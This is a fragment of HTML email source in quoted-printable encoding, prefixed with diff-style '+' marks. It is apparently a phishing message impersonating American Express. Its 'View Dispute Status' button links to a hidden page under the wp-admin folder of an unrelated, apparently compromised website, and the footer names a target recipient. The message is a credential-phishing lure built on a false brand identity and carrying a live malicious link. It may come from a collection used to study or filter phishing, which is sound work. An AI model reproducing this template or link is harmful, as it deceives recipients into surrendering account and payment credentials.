+x" align=3Dleft><SPAN style=3D"FONT-SIZE: 17px; FONT-FAMILY: arial; WHITE-S=
+PACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WE=
+IGHT: 400; COLOR: rgb(0,23,90); FONT-STYLE: normal; TEXT-ALIGN: center; DIS=
+PLAY: inline !important; TEXT-INDENT: 0px; text-decoration-color: initial">=
+</SPAN>&nbsp;</P></TD></TR>
+<TR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TD style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; PADDING-BOTT=
+OM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0=
+px" height=3D10>&nbsp;</TD></TR>
+<TR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TD style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; PADDING-BOTT=
+OM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0=
+px">
+<TABLE style=3D"FONT-FAMILY: new; BORDER-TOP-COLOR: rgb(217,217,217); WIDTH=
+: 583px; WORD-SPACING: 0px; TEXT-TRANSFORM: none; WORD-BREAK: normal; BORDE=
+R-LEFT-COLOR: rgb(217,217,217); BORDER-BOTTOM-COLOR: rgb(217,217,217); MARG=
+IN-LEFT: auto; BORDER-RIGHT-COLOR: rgb(217,217,217); MARGIN-RIGHT: auto; TE=
+XT-INDENT: 0px; text-decoration-color: initial" cellSpacing=3D0 cellPadding=
+=3D0 border=3D0>
+<TBODY style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TD style=3D"BORDER-TOP: rgb(0,23,90) 2px solid; FONT-FAMILY: arial, helvet=
+ica, clean, sans-serif; BORDER-RIGHT: rgb(0,23,90) 2px solid; WIDTH: 579px;=
+ BORDER-BOTTOM: rgb(0,23,90) 2px solid; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
+px; PADDING-LEFT: 0px; BORDER-LEFT: rgb(0,23,90) 2px solid; MARGIN: 0px; PA=
+DDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(0,23,90); border-radius: 6px" align=
+=3Dcenter>
+<A style=3D"FONT-SIZE: 12pt; TEXT-DECORATION: none; BORDER-TOP: rgb(0,23,90=
+) 1px solid; FONT-FAMILY: arial; BORDER-RIGHT: rgb(0,23,90) 1px solid; WIDT=
+H: 480px; BACKGROUND: rgb(0,23,90); BORDER-BOTTOM: rgb(0,23,90) 1px solid; =
+FONT-WEIGHT: bold; COLOR: rgb(255,255,255); PADDING-BOTTOM: 10px; TEXT-ALIG=
+N: center; PADDING-TOP: 10px; PADDING-LEFT: 10px; BORDER-LEFT: rgb(0,23,90)=
+ 1px solid; DISPLAY: block; LINE-HEIGHT: 25px; PADDING-RIGHT: 10px; border-=
+radius: 20px"=20
+href=3D"https://posodontosuprema.com.br/wp-admin/.clone_3wMvio20/wx.htm" re=
+l=3D"noopener noreferrer" target=3D_blank data-link-id=3D"5084">View&nbsp;D=
+ispute Status</A></TD></TR></TBODY></TABLE>&nbsp;</TD></TR>
+<TR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TD style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; PADDING-BOTT=
+OM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0=
+px" height=3D10>&nbsp;</TD></TR>
+<TR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TD style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; PADDING-BOTT=
+OM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0=
+px"><STRONG style=3D"FONT-SIZE: 17px; FONT-FAMILY: arial; WHITE-SPACE: norm=
+al; WORD-SPACING: 0px; TEXT-TRANSFORM: none; COLOR: rgb(0,23,90); FONT-STYL=
+E: normal; TEXT-ALIGN: center; TEXT-INDENT: 0px; text-decoration-color: ini=
+tial">This notice has been generated electronically for zingerpie@kfcreview=
+=2Ecom</STRONG></TD></TR>
+<TR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TD style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; PADDING-BOTT=
+OM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0=
+px" height=3D10>&nbsp;</TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+<TABLE class=3Dd00452cf828c1c2911c69f23ab30b8yiv8581792665nysz_nzyrs.nzyrsn=
+yrsnzysssynr style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial, helvetica, clean=
+, sans-serif; BORDER-TOP-COLOR: rgb(217,217,217); WIDTH: 650px; WHITE-SPACE=
+: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; WORD-BREAK: normal; BORD=
+ER-LEFT-COLOR: rgb(217,217,217); FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-=
+STYLE: normal; BORDER-BOTTOM-COLOR: rgb(217,217,217); ORPHANS: 2; WIDOWS: 2=
+; BORDER-RIGHT-COLOR: rgb(217,217,217);=20
+LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; f=
+ont-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-t=
+hickness: initial; text-decoration-style: initial; text-decoration-color: i=
+nitial" cellSpacing=3D0 cellPadding=3D0 align=3Dcenter bgColor=3D#ffffff bo=
+rder=3D0>
+<TBODY style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TD class=3Dd00452cf828c1c2911c69f23ab30b8yiv8581792665nysz_nzyrs.nzyrsnyrs=
+nzysssynr style=3D"BORDER-TOP: rgb(255,255,255) 5px solid; FONT-FAMILY: ari=
+al, helvetica, clean, sans-serif; BACKGROUND: no-repeat; PADDING-BOTTOM: 0p=
+x; PADDING-TOP: 0px; PADDING-LEFT: 0px; MIN-HEIGHT: 80px; MARGIN: 0px; PADD=
+ING-RIGHT: 0px">&nbsp;</TD></TR>
+<TR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TD style=3D"FONT-SIZE: 11px; FONT-FAMILY: arial, helvetica, sans-serif; CO=
+LOR: rgb(102,102,102); PADDING-BOTTOM: 0px; PADDING-TOP: 12px; PADDING-LEFT=
+: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
+<HR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+
+<P style=3D"FONT-SIZE: 16px; FONT-FAMILY: arial, helvetica, clean, sans-ser=
+if; COLOR: rgb(81,84,94); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LE=
+FT: 0px; MARGIN: 0.4em 0px 1.18em; LINE-HEIGHT: 1.625; PADDING-RIGHT: 0px">=
+<STRONG>Thanks,</STRONG><BR style=3D"FONT-FAMILY: arial, helvetica, clean, =
+sans-serif"><STRONG>American Express Customer Service Team.</STRONG></P></T=
+D></TR></TBODY></TABLE></BODY></HTML>
